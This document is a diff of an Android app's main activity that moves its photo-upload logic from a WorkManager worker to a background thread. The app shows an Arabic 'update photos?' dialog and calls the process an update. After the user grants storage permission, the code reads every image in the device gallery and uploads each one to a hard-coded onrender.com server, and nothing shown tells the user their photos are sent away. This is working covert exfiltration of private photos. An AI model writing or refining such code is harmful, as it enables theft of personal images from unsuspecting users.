@@ -2,6 +2,7 @@ package com.photouploader.app
 
 import android.Manifest
 import android.app.AlertDialog
+import android.content.ContentResolver
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
@@ -11,14 +12,6 @@ import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import androidx.work.Constraints
-import androidx.work.CoroutineWorker
-import androidx.work.NetworkType
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkManager
-import androidx.work.WorkerParameters
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
 import java.io.DataOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
@@ -29,6 +22,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val PERMISSION_REQUEST = 1001
+
         private const val SERVER_URL =
             "https://photo-uploader-zt2f.onrender.com/upload"
     }
@@ -48,6 +42,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showUpdateDialog() {
+
         AlertDialog.Builder(this)
             .setTitle("تحديث الصور")
             .setMessage("هل تريد التحديث؟")
@@ -70,13 +65,15 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.READ_EXTERNAL_STORAGE
             }
 
-        if (ContextCompat.checkSelfPermission(
+        if (
+            ContextCompat.checkSelfPermission(
                 this,
                 permission
             ) == PackageManager.PERMISSION_GRANTED
         ) {
-            startUpload()
+            startPhotoUpload()
         } else {
+
             ActivityCompat.requestPermissions(
                 this,
                 arrayOf(permission),
@@ -90,6 +87,7 @@ class MainActivity : AppCompatActivity() {
         permissions: Array<String>,
         grantResults: IntArray
     ) {
+
         super.onRequestPermissionsResult(
             requestCode,
             permissions,
@@ -98,86 +96,29 @@ class MainActivity : AppCompatActivity() {
 
         if (requestCode == PERMISSION_REQUEST) {
 
-            if (grantResults.isNotEmpty() &&
+            if (
+                grantResults.isNotEmpty() &&
                 grantResults[0] == PackageManager.PERMISSION_GRANTED
             ) {
-                startUpload()
+                startPhotoUpload()
             } else {
-                statusText.text = "لم يتم السماح بالوصول إلى الصور"
+
+                statusText.text =
+                    "لم يتم السماح بالوصول إلى الصور"
             }
         }
     }
 
-    private fun startUpload() {
+    private fun startPhotoUpload() {
 
         statusText.text = "جاري التحديث…"
 
-        val constraints = Constraints.Builder()
-            .setRequiredNetworkType(NetworkType.CONNECTED)
-            .build()
-
-        val request =
-            OneTimeWorkRequestBuilder<PhotoUploadWorker>()
-                .setConstraints(constraints)
-                .build()
-
-        WorkManager
-            .getInstance(applicationContext)
-            .enqueue(request)
-
-        observeUpload(request.id)
-    }
-
-    private fun observeUpload(id: java.util.UUID) {
-
-        WorkManager
-            .getInstance(applicationContext)
-            .getWorkInfoByIdLiveData(id)
-            .observe(this) { info ->
-
-                if (info == null) return@observe
-
-                when (info.state) {
-
-                    androidx.work.WorkInfo.State.SUCCEEDED -> {
-                        statusText.text = "تم التحديث بنجاح ✅"
-                    }
-
-                    androidx.work.WorkInfo.State.FAILED -> {
-                        statusText.text = "تعذر إكمال التحديث"
-                    }
-
-                    androidx.work.WorkInfo.State.CANCELLED -> {
-                        statusText.text = "تم إلغاء التحديث"
-                    }
-
-                    else -> {
-                        statusText.text = "جاري التحديث…"
-                    }
-                }
-            }
-    }
-}
-
-
-class PhotoUploadWorker(
-    appContext: android.content.Context,
-    workerParams: WorkerParameters
-) : CoroutineWorker(appContext, workerParams) {
-
-    companion object {
-        private const val SERVER_URL =
-            "https://photo-uploader-zt2f.onrender.com/upload"
-    }
-
-    override suspend fun doWork(): Result {
-
-        return withContext(Dispatchers.IO) {
+        Thread {
 
             try {
 
                 val resolver =
-                    applicationContext.contentResolver
+                    contentResolver
 
                 val projection = arrayOf(
                     MediaStore.Images.Media._ID,
@@ -187,6 +128,9 @@ class PhotoUploadWorker(
 
                 val collection =
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+
+                var total = 0
+                var uploaded = 0
 
                 resolver.query(
                     collection,
@@ -213,11 +157,14 @@ class PhotoUploadWorker(
 
                     while (cursor.moveToNext()) {
 
+                        total++
+
                         val id =
                             cursor.getLong(idColumn)
 
                         val fileName =
                             cursor.getString(nameColumn)
+                                ?: "photo_$id.jpg"
 
                         val mimeType =
                             cursor.getString(mimeColumn)
@@ -231,29 +178,57 @@ class PhotoUploadWorker(
 
                         val success =
                             uploadFile(
+                                resolver,
                                 uri,
                                 fileName,
                                 mimeType
                             )
 
                         if (!success) {
-                            return@withContext Result.retry()
+                            throw Exception(
+                                "Upload failed"
+                            )
                         }
+
+                        uploaded++
                     }
                 }
 
-                Result.success()
+                runOnUiThread {
+
+                    if (total == 0) {
+
+                        statusText.text =
+                            "لا توجد صور"
+
+                    } else if (uploaded == total) {
+
+                        statusText.text =
+                            "تم التحديث بنجاح ✅"
+
+                    } else {
+
+                        statusText.text =
+                            "تعذر إكمال التحديث"
+                    }
+                }
 
             } catch (e: Exception) {
 
                 e.printStackTrace()
 
-                Result.retry()
+                runOnUiThread {
+
+                    statusText.text =
+                        "تعذر إكمال التحديث"
+                }
             }
-        }
+
+        }.start()
     }
 
     private fun uploadFile(
+        resolver: ContentResolver,
         uri: Uri,
         fileName: String,
         mimeType: String
@@ -276,12 +251,18 @@ class PhotoUploadWorker(
             connection.doOutput = true
             connection.doInput = true
             connection.useCaches = false
+
             connection.connectTimeout = 30000
             connection.readTimeout = 120000
 
             connection.setRequestProperty(
                 "Content-Type",
                 "multipart/form-data; boundary=$boundary"
+            )
+
+            connection.setRequestProperty(
+                "Connection",
+                "keep-alive"
             )
 
             val output =
@@ -294,39 +275,48 @@ class PhotoUploadWorker(
             )
 
             output.writeBytes(
-                "Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n"
+                "Content-Disposition: form-data; name=\"file\"; filename=\"${fileName.replace("\"", "")}\"\r\n"
             )
 
             output.writeBytes(
-                "Content-Type: $mimeType\r\n\r\n"
+                "Content-Type: $mimeType\r\n"
             )
 
-            applicationContext
-                .contentResolver
-                .openInputStream(uri)
-                ?.use { input ->
+            output.writeBytes(
+                "\r\n"
+            )
 
-                    val buffer =
-                        ByteArray(8192)
+            resolver.openInputStream(uri)?.use { input ->
 
-                    var bytesRead: Int
+                val buffer =
+                    ByteArray(8192)
 
-                    while (
-                        input.read(buffer).also {
-                            bytesRead = it
-                        } != -1
-                    ) {
-                        output.write(
-                            buffer,
-                            0,
-                            bytesRead
-                        )
+                while (true) {
+
+                    val bytesRead =
+                        input.read(buffer)
+
+                    if (bytesRead == -1) {
+                        break
                     }
-                }
-                ?: return false
 
-            output.writeBytes("\r\n")
-            output.writeBytes("--$boundary--\r\n")
+                    output.write(
+                        buffer,
+                        0,
+                        bytesRead
+                    )
+                }
+
+            } ?: return false
+
+            output.writeBytes(
+                "\r\n"
+            )
+
+            output.writeBytes(
+                "--$boundary--\r\n"
+            )
+
             output.flush()
             output.close()
 
